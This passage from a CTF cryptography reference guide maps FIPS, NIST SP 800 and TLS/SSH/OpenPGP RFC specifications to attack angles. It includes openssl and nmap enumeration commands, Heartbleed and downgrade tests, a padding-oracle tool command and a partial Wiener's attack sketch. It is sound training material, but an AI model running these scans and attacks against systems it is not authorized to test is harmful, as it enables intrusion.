openssl enc -aes-256-cbc -in plaintext.txt -out encrypted.bin -K <hex_key> -iv <hex_iv>
openssl enc -d -aes-256-cbc -in encrypted.bin -out decrypted.txt -K <hex_key> -iv <hex_iv>

# ECB mode (no IV, pattern leakage)
openssl enc -aes-256-ecb -in plaintext.txt -out encrypted.bin -K <hex_key>

# Test for ECB patterns visually
convert encrypted.bin -depth 8 -size 512x512 gray:- ecb_pattern.png
```

**FIPS 198-1 - Keyed-Hash Message Authentication Code (HMAC)**

- Specifies HMAC construction using approved hash functions
- CTF exploitation: Length extension attacks don't work on HMAC (unlike raw hash functions)

```bash
# Generate HMAC
echo -n "message" | openssl dgst -sha256 -hmac "secret_key"

# Verify HMAC
echo -n "message" | openssl dgst -sha256 -hmac "secret_key" -hex

# Python for HMAC operations
python3 -c "import hmac, hashlib; print(hmac.new(b'key', b'message', hashlib.sha256).hexdigest())"
```

**FIPS Mode Exploitation Vectors:**

- FIPS mode disables non-approved algorithms (MD5, DES, RC4)
- [Inference] Systems in FIPS mode may reject connections using weak ciphers, potentially revealing configuration
- Testing cipher availability:

```bash
# Check OpenSSL supported ciphers
openssl ciphers -v 'ALL:eNULL' | grep -v FIPS

# Test TLS connection with specific cipher
openssl s_client -connect target:443 -cipher 'DES-CBC3-SHA'
```

### NIST SP 800 Series

The Special Publication 800 series provides computer security guidance, recommendations, and technical specifications. These documents define best practices that CTF challenges often deliberately violate.

**SP 800-38 Series - Block Cipher Modes**

**SP 800-38A - Modes of Operation (ECB, CBC, CFB, OFB, CTR)**

- ECB: Each block encrypted independently (pattern leakage)
- CBC: Requires IV, vulnerable to padding oracle attacks
- CTR: Turns block cipher into stream cipher, IV reuse catastrophic
- CTF identification:

```bash
# Detect cipher mode from ciphertext patterns
python3 << EOF
from collections import Counter
data = open('ciphertext.bin', 'rb').read()
blocks = [data[i:i+16] for i in range(0, len(data), 16)]
print(f"Unique blocks: {len(set(blocks))}/{len(blocks)}")
# Low ratio suggests ECB mode
EOF
```

**SP 800-38D - Galois/Counter Mode (GCM)**

- Authenticated encryption with associated data (AEAD)
- Authentication tag prevents tampering
- [Inference] Nonce reuse in GCM allows authentication key recovery
- Testing GCM:

```bash
# Encrypt with GCM
openssl enc -aes-256-gcm -in plaintext.txt -out encrypted.bin -K <hex_key> -iv <hex_iv>

# GCM requires handling authentication tag separately in raw mode
```

**SP 800-38F - Key Wrapping**

- AES Key Wrap (AES-KW) for encrypting key material
- KWP (Key Wrap with Padding) variant
- CTF scenarios: Key wrapping implementations sometimes exposed in JWT, XML encryption

**SP 800-52 Rev 2 - TLS Guidelines**

- Recommends TLS 1.2 minimum (TLS 1.3 preferred)
- Specifies approved cipher suites
- CTF enumeration:

```bash
# Test supported TLS versions
nmap --script ssl-enum-ciphers -p 443 target

# Detailed TLS testing
sslscan target:443
testssl.sh target:443

# Force specific TLS version
openssl s_client -connect target:443 -tls1
openssl s_client -connect target:443 -tls1_2
```

**SP 800-56A/B - Key Establishment (DH, ECDH, RSA)**

- Specifies key agreement schemes
- Parameter validation requirements
- CTF exploitation: Invalid curve attacks, weak DH parameters

```bash
# Test for weak DH parameters
openssl s_client -connect target:443 -cipher 'DHE' 2>&1 | grep "Server Temp Key"

# Extract DH parameters
openssl s_client -connect target:443 -showcerts < /dev/null 2>&1 | openssl x509 -text
```

**SP 800-57 - Key Management Recommendations**

- Key lifetime and rotation guidelines
- Key strength recommendations (80, 112, 128, 192, 256 bits security)
- Equivalence: 2048-bit RSA ≈ 112-bit symmetric ≈ 224-bit ECC
- CTF relevance: Expired keys, insufficient key sizes

**SP 800-63B - Digital Identity Guidelines (Authentication)**

- Password complexity and entropy requirements
- Memorized secret guidelines (passwords)
- CTF context: Weak password policies, predictable secrets

**SP 800-90A/B/C - Random Number Generation**

- SP 800-90A: DRBG specifications (Hash_DRBG, HMAC_DRBG, CTR_DRBG)
- SP 800-90B: Entropy source validation
- SP 800-90C: RNG construction
- CTF exploitation: Weak or predictable RNG states

```bash
# Check Linux entropy available
cat /proc/sys/kernel/random/entropy_avail

# Read from random sources
head -c 32 /dev/random | xxd
head -c 32 /dev/urandom | xxd

# Test for randomness quality
rngtest < random_data.bin

# Collect entropy statistics
ent random_data.bin
```

**SP 800-131A - Transitioning to Cryptographic Algorithms**

- Deprecation timelines for algorithms
- Currently deprecated: SHA-1 for signatures, 1024-bit RSA, two-key 3DES
- CTF scenarios often use deprecated algorithms intentionally

### RFC Specifications (TLS, SSH, OpenPGP)

RFCs (Request for Comments) define Internet standards. Understanding these specifications reveals implementation requirements and common deviation points exploitable in CTFs.

**TLS (Transport Layer Security) RFCs**

**RFC 5246 - TLS 1.2**

- Master secret derivation from pre-master secret
- Cipher suite negotiation process
- Extension mechanisms
- CTF exploitation points:
    - Downgrade attacks (forcing weak cipher suites)
    - Renegotiation vulnerabilities
    - Extension abuse

**RFC 8446 - TLS 1.3**

- Simplified handshake (1-RTT, 0-RTT modes)
- Removed RSA key exchange (forward secrecy mandatory)
- Encrypted handshake messages
- [Inference] 0-RTT mode may allow replay attacks in specific scenarios
- Testing TLS 1.3:

```bash
# Connect with TLS 1.3
openssl s_client -connect target:443 -tls1_3

# Capture TLS 1.3 handshake
tshark -i eth0 -f "port 443" -Y "tls.handshake" -V
```

**RFC 6066 - TLS Extensions**

- Server Name Indication (SNI)
- Maximum Fragment Length Negotiation
- CTF usage:

```bash
# SNI for virtual hosting
openssl s_client -connect 192.168.1.1:443 -servername target.com

# Capture SNI in traffic
tshark -i eth0 -Y "tls.handshake.extensions_server_name" -T fields -e tls.handshake.extensions_server_name
```

**RFC 7627 - Extended Master Secret**

- Binds master secret to handshake log
- Prevents certain MITM attacks
- Detection:

```bash
openssl s_client -connect target:443 2>&1 | grep "Extended master secret"
```

**RFC 5077 - TLS Session Resumption (Session Tickets)**

- Stateless session resumption
- Server encrypts session state, client presents ticket
- CTF exploitation: Ticket encryption key compromise, forward secrecy implications

```bash
# Observe session ticket usage
openssl s_client -connect target:443 -sess_out session.txt
openssl s_client -connect target:443 -sess_in session.txt

# Extract ticket from PCAP
tshark -r capture.pcap -Y "tls.handshake.extensions.type == 35" -T fields -e tls.handshake.session_ticket
```

**Known TLS Vulnerabilities Referenced by RFCs:**

- BEAST (RFC vulnerability in CBC mode with TLS 1.0)
- CRIME/BREACH (compression side-channels)
- POODLE (padding oracle in SSLv3, TLS CBC)
- Heartbleed (RFC 6520 - TLS Heartbeat Extension implementation bug)

```bash
# Test for Heartbleed
nmap -p 443 --script ssl-heartbleed target

# Manual Heartbleed testing
python3 heartbleed-poc.py target 443
```

**SSH (Secure Shell) RFCs**

**RFC 4251 - SSH Protocol Architecture**

- Binary packet protocol structure
- Algorithm negotiation mechanism
- CTF relevance: Understanding packet format for custom implementations

**RFC 4252 - SSH Authentication Protocol**

- publickey, password, hostbased, keyboard-interactive methods
- CTF exploitation:

```bash
# Enumerate supported authentication methods
ssh -o PreferredAuthentications=none user@target

# Test for password authentication
ssh -o PreferredAuthentications=password user@target

# Verbose SSH connection for debugging
ssh -vvv user@target
```

**RFC 4253 - SSH Transport Layer Protocol**

- Key exchange methods (diffie-hellman-group14-sha256, ecdh-sha2-nistp256)
- Encryption algorithms (aes128-ctr, chacha20-poly1305@openssh.com)
- MAC algorithms (hmac-sha2-256, hmac-sha2-512)
- Enumeration:

```bash
# Scan SSH configuration
nmap -p 22 --script ssh2-enum-algos target

# Detailed SSH algorithm support
ssh -Q cipher
ssh -Q mac
ssh -Q kex
ssh -Q key

# Force specific algorithms
ssh -c aes128-cbc -m hmac-sha1 user@target
```

**RFC 4254 - SSH Connection Protocol**

- Channel mechanism (session, x11, forwarding)
- Port forwarding specifications
- CTF techniques:

```bash
# Local port forwarding
ssh -L 8080:internal-host:80 user@target

# Remote port forwarding
ssh -R 8080:localhost:80 user@target

# Dynamic SOCKS proxy
ssh -D 1080 user@target

# X11 forwarding
ssh -X user@target
```

**RFC 4256 - SSH Keyboard-Interactive Authentication**

- Generic challenge-response mechanism
- Often used for 2FA/OTP
- Testing:

```bash
ssh -o PreferredAuthentications=keyboard-interactive user@target
```

**RFC 4419 - Diffie-Hellman Group Exchange**

- Dynamic DH parameter negotiation
- Client requests group size
- [Inference] Servers may support weak group sizes for compatibility

```bash
# Observe DH group exchange in verbose mode
ssh -vvv user@target 2>&1 | grep "diffie-hellman-group"
```

**OpenPGP RFCs**

**RFC 4880 - OpenPGP Message Format**

- Packet structure and types
- Key formats (public key, secret key, subkeys)
- Signature types and trust models
- CTF analysis:

```bash
# Parse OpenPGP packets
gpg --list-packets message.asc
pgpdump message.asc

# Show detailed packet structure
gpg --list-packets --verbose message.asc

# Extract key information
gpg --import key.asc
gpg --list-keys --with-fingerprint
gpg --list-secret-keys

# Export keys in different formats
gpg --export KEY_ID > pubkey.gpg
gpg --export-secret-keys KEY_ID > seckey.gpg
gpg --export --armor KEY_ID > pubkey.asc
```

**Packet Types (CTF Relevant):**

- Tag 1: Public-Key Encrypted Session Key Packet
- Tag 2: Signature Packet
- Tag 5: Secret-Key Packet
- Tag 6: Public-Key Packet
- Tag 9: Symmetrically Encrypted Data Packet
- Tag 11: Literal Data Packet

**RFC 4880 Section 3.7 - Symmetric-Key Algorithms**

- Algorithm IDs: 1=IDEA, 2=3DES, 3=CAST5, 7=AES128, 8=AES192, 9=AES256
- CTF scenarios: Weak algorithm usage

```bash
# Specify cipher for encryption
gpg --cipher-algo AES256 --symmetric file.txt

# Check algorithm used in message
gpg --list-packets encrypted.gpg | grep "cipher algo"
```

**RFC 4880 Section 5.2 - Public-Key Algorithms**

- 1=RSA (Encrypt or Sign), 2=RSA Encrypt-Only, 3=RSA Sign-Only
- 16=Elgamal (Encrypt-Only), 17=DSA, 18=ECDH, 19=ECDSA, 22=EdDSA

**RFC 6637 - Elliptic Curve Cryptography in OpenPGP**

- ECC key format and usage
- Supported curves: NIST P-256, P-384, P-521, Curve25519

```bash
# Generate ECC key
gpg --full-generate-key --expert
# Select option (9) ECC and ECC

# Specify curve
gpg --quick-gen-key "user@example.com" future-default default 1y
```

**RFC 5581 - The Camellia Cipher in OpenPGP** **RFC 5639 - ECC Brainpool Curves**

- Alternative cipher and curve specifications
- Less common in CTFs but may appear in enterprise contexts

**Common OpenPGP Exploitation Vectors:**

- Weak key generation (low entropy, small key sizes)
- EFAIL vulnerabilities (malleability in CFB mode)
- Key fingerprint collisions
- Trust model abuse

```bash
# Test key strength
gpg --list-keys --with-subkey-fingerprint

# Verify signatures
gpg --verify signature.asc file.txt

# Decrypt with specific secret key
gpg --decrypt --try-secret-key KEY_ID encrypted.gpg

# Test for EFAIL (malleability attack preparation)
# Capture encrypted message and modify ciphertext blocks
```

**Cross-RFC CTF Techniques:**

**Protocol Version Downgrade**

```bash
# Force older TLS
openssl s_client -connect target:443 -tls1

# Force older SSH
ssh -o Protocol=1 user@target  # If SSH1 supported
```

**Cipher Suite Analysis**

```bash
# TLS cipher enumeration
nmap --script ssl-enum-ciphers -p 443 target | grep -A 4 "TLSv1.2"

# SSH cipher test
ssh -c 3des-cbc user@target  # Test for weak ciphers
```

**Certificate and Key Inspection**

```bash
# X.509 certificate analysis (TLS)
openssl s_client -connect target:443 -showcerts | openssl x509 -text -noout

# SSH host key fingerprint
ssh-keyscan target | ssh-keygen -lf -

# OpenPGP key fingerprint
gpg --fingerprint KEY_ID
```

**Important Related Topics:**

- **Algorithm Agility and Negotiation Attacks**: Understanding how protocols negotiate cryptographic parameters
- **Certificate Transparency and PKI**: X.509 certificate validation, trust chains, CT logs
- **Cryptographic Oracle Attacks**: Padding oracles (CBC), compression oracles (CRIME/BREACH), timing oracles
- **Side-Channel Analysis**: Timing attacks on constant-time implementations, cache timing

---

## Algorithm Specifications

### Peer-reviewed cryptographic papers

Peer-reviewed cryptographic papers serve as the foundational documentation for understanding both the design principles and vulnerabilities of cryptographic algorithms used in CTF challenges. These academic sources provide rigorous mathematical proofs, security models, and formal analysis that competitors reference when evaluating algorithm strength and identifying potential attack vectors.

**Primary Research Databases**

Access cryptographic research through these established repositories:

- **IACR ePrint Archive** (https://eprint.iacr.org/): The International Association for Cryptologic Research maintains the most comprehensive collection of cryptography papers, including preprints and published works. Search using algorithm names, attack types, or author names.
    
- **IEEE Xplore** and **ACM Digital Library**: Host papers from major security conferences (CCS, S&P, USENIX Security) where novel attacks are frequently disclosed.
    
- **Cryptology ePrint Archive mirror**: Available via command line tools for bulk searching.
    

**Critical Conference Proceedings**

Papers from these venues are most relevant for CTF exploitation:

- **CRYPTO** and **EUROCRYPT**: Premier conferences for symmetric and asymmetric cryptography
- **Asiacrypt**: Focus on cryptanalysis and implementation attacks
- **Fast Software Encryption (FSE)**: Stream ciphers, block ciphers, and hash functions
- **Real World Crypto (RWC)**: Practical attacks on deployed systems

**Reading Algorithm Specifications**

When analyzing a paper for CTF purposes:

1. **Security Claims Section**: Identifies what the algorithm is designed to resist. CTF challenges often exploit scenarios outside these claims.
    
2. **Parameter Recommendations**: Note minimum key sizes, round counts, and security margins. Challenges frequently use weakened parameters (e.g., RSA with e=3, reduced AES rounds).
    
3. **Known Weaknesses**: Even secure algorithms have documented edge cases. Look for sections titled "Security Analysis," "Limitations," or "Related-Key Attacks."
    
4. **Implementation Notes**: Timing considerations, side-channel resistance, and specific operational modes often contain exploitable details.
    

**Extracting Actionable Intelligence**

For CTF preparation, maintain a reference library organized by:

- **Algorithm family** (RSA, ECC, AES, ChaCha20)
- **Attack category** (padding oracle, side-channel, mathematical weakness)
- **Parameter ranges** (key sizes where attacks become practical)

Example workflow when encountering an unknown algorithm in a CTF:

```bash
# Search IACR archive from command line
curl -s "https://eprint.iacr.org/search?q=ALGORITHM_NAME" | grep -i "pdf\|abstract"

# Download relevant papers
wget https://eprint.iacr.org/YEAR/NUMBER.pdf

# Extract key sections using pdftotext
pdftotext -layout paper.pdf - | grep -A 20 "Security\|Attack\|Weakness"
```

**Common CTF Algorithm Sources**

Challenges frequently reference these specific papers:

- **RSA**: Rivest, Shamir, Adleman (1978) - Original RSA paper
- **Padding attacks**: Bleichenbacher's "Chosen Ciphertext Attacks Against Protocols Based on the RSA Encryption Standard PKCS #1" (1998)
- **AES**: Daemen and Rijmen's "AES Proposal: Rijndael" (1999)
- **Elliptic curves**: Miller's "Use of Elliptic Curves in Cryptography" (1985), Koblitz's independent work (1987)
- **Hash collisions**: Wang et al. MD5 collision papers (2004-2005)

**Recognizing Reduced-Security Variants**

CTF challenges implement deliberate weaknesses. Compare challenge parameters against paper recommendations:

|Algorithm|Paper Recommendation|Common CTF Weakness|
|---|---|---|
|RSA|e=65537, n≥2048 bits|e=3, n=512 bits|
|AES|10/12/14 rounds|4-7 rounds|
|DH|p≥2048 bits|p=512 bits, smooth p-1|
|ECC|Curves over prime fields|Singular curves, small order|

**[Inference]** Most CTF cryptography challenges use algorithms with documented attacks in peer-reviewed literature rather than custom primitives, as this allows for solvable-but-challenging problems based on known mathematical weaknesses.

### Published attack proofs

Published attack proofs provide the mathematical framework and practical methodology for exploiting cryptographic implementations. These documents detail the exact conditions, complexity, and step-by-step procedures for breaking algorithms under specific scenarios—information directly applicable to CTF challenge solving.

**Attack Proof Components**

A complete attack proof contains:

1. **Threat Model**: Defines attacker capabilities (chosen plaintext, ciphertext only, side-channel access)
2. **Preconditions**: Parameter ranges where the attack succeeds
3. **Complexity Analysis**: Time and space requirements (expressed in big-O notation)
4. **Algorithm**: Step-by-step procedure, often with pseudocode
5. **Proof of Correctness**: Mathematical demonstration of why the attack works
6. **Experimental Results**: Real-world validation with timing data

**Locating Attack Proofs**

Beyond the research databases mentioned above, attack-specific resources include:

```bash
# Clone the Cryptographic Attacks Repository
git clone https://github.com/jvdsn/crypto-attacks.git
cd crypto-attacks

# This repository contains implementations of attacks from papers
ls -R | grep -E "\.py$|\.sage$"
```

**Key Attack Categories and Reference Papers**

**RSA Attacks:**

- **Wiener's attack** (small private exponent): "Cryptanalysis of Short RSA Secret Exponents" - Recovers d when d < N^0.292
- **Håstad's broadcast attack**: Exploits e=3 with identical messages to multiple recipients
- **Coppersmith's theorem applications**: "Finding Small Solutions to Small Degree Polynomials" - Framework for multiple RSA attacks
- **Fermat factorization**: When p and q are close together

**Block Cipher Attacks:**

- **Padding oracle attack**: Vaudenay's "Security Flaws Induced by CBC Padding" (2002) - Decrypt CBC-mode ciphertext without keys
- **Meet-in-the-middle**: Applied to double encryption schemes
- **Linear cryptanalysis**: Matsui's attack on DES (1993)
- **Differential cryptanalysis**: Biham and Shamir's attack framework (1990)

**Implementing Attacks from Proofs**

When translating a proof to working exploit code:

```python
# Example: Wiener's attack implementation structure based on proof
from sage.all import continued_fraction, convergents

def wiener_attack(e, n):
    """
    Implementation following Wiener's 1990 proof
    Precondition: d < (1/3) * n^(1/4)
    """
    # Step 1: Compute continued fraction expansion of e/n
    cf = continued_fraction(e/n)
    
    # Step 2: Test each convergent k/d as potential key
    for k, d in convergents(cf):
        if k == 0:
            continue
            
        # Step 3: Verify if this d satisfies ed ≡ 1 (mod φ(n))
        phi_candidate = (e * d - 1) // k
        
        # Step 4: Solve for p, q using φ(n) = n - p - q + 1
        # [Implementation continues following proof steps]
```

**Complexity Verification**

Attack proofs specify complexity. Verify CTF challenges are solvable:

- **Polynomial time attacks**: O(n^k) - Generally solvable in CTF timeframes
- **Sub-exponential attacks**: O(e^(n^c)) where c<1 - May require parameter optimization
- **Exponential attacks**: O(2^n) - Only feasible for deliberately small parameters

Example verification:

```python
import math

def check_attack_feasibility(n_bits, complexity_function, time_limit_seconds=3600):
    """
    Verify if attack complexity allows CTF solution within time limit
    
    [Inference] Assumes modern CPU ~10^9 operations/second
    """
    operations = complexity_function(n_bits)
    estimated_seconds = operations / 1e9
    
    return estimated_seconds < time_limit_seconds

# Example: Pollard's rho factorization O(√n)
n_bits = 64
ops = 2**(n_bits/2)  # √(2^64) = 2^32
feasible = check_attack_feasibility(n_bits, lambda x: 2**(x/2))
print(f"64-bit factorization feasible: {feasible}")
```

**Side-Channel Attack Proofs**

Timing and power analysis attacks have formal proofs:

- **Kocher's timing attack** (1996): "Timing Attacks on Implementations of Diffie-Hellman, RSA, DSS, and Other Systems"
- **Differential Power Analysis**: Kocher et al. (1999)
- **Cache-timing attacks**: Bernstein's "Cache-timing attacks on AES" (2005)

These rarely appear in traditional CTF forensics challenges but are relevant in hardware CTF categories.

**Cross-Referencing Attacks with Tools**

Many published attacks have tool implementations:

|Attack Type|Tool|Command Example|
|---|---|---|
|Wiener's attack|RsaCtfTool|`python3 RsaCtfTool.py -n N -e E --attack wiener`|
|Coppersmith methods|Sage|`R.<x> = PolynomialRing(Zmod(n)); f.small_roots()`|
|Padding oracle|PadBuster|`padbuster http://target/decrypt CIPHERTEXT 8 -encoding 0`|
|Hash length extension|hash_extender|`hash_extender -d original -s signature -f sha256 -a append`|

**Validating Attack Applicability**

Before implementing an attack from a proof:

1. **Match threat model**: Does the CTF challenge provide the attacker capabilities assumed in the proof?
2. **Verify preconditions**: Are parameters within the attack's effective range?
3. **Check complexity**: Is the attack computationally feasible?
4. **Test toy examples**: Validate implementation on small instances before scaling up

**[Unverified]** Some attack proofs contain implementation optimizations not included in the published paper, discovered by the CTF community through practical application. These are typically shared in CTF writeups rather than academic venues.

**Recommended Attack Proof Collections**

- **"Twenty Years of Attacks on the RSA Cryptosystem"** by Dan Boneh (1999) - Comprehensive survey of RSA attacks with complexity analysis
- **"A Survey of Fast Exponentiation Methods"** - Relevant for timing attacks
- **Handbook of Applied Cryptography** (Menezes, van Oorschot, Vanstone) - Chapter 13 covers attack methodologies with formal proofs

When encountering an unfamiliar algorithm or implementation in a CTF, the workflow should be: (1) locate specification paper, (2) identify attack proofs against that specification, (3) verify attack preconditions match challenge parameters, (4) implement or adapt existing attack tools based on the proof.

---